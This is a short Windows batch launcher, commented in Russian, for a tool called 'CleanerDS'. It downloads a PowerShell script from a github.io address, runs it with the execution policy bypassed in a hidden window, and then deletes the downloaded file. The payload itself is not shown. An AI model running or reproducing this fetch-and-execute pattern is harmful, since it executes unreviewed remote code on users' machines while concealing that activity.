@echo off
chcp 65001 >nul
setlocal

:: Настройка путей
set "URL=https://cleands.github.io/cds/script.ps1"
set "PS_FILE=%TEMP%\CleanerDS_App.ps1"

echo [CleanerDS] Подключение к серверу и загрузка...
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest '%URL%' -OutFile '%PS_FILE%' -UseBasicParsing } catch { exit 1 }"

if not exist "%PS_FILE%" (
    echo [Ошибка] Не удалось загрузить скрипт. Проверь интернет или доступность GitHub.
    pause
    exit /b 1
)

:: Запуск в полностью скрытом режиме
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_FILE%"

:: Удаляем временный файл после закрытия интерфейса
del /f /q "%PS_FILE%" >nul 2>&1
exit
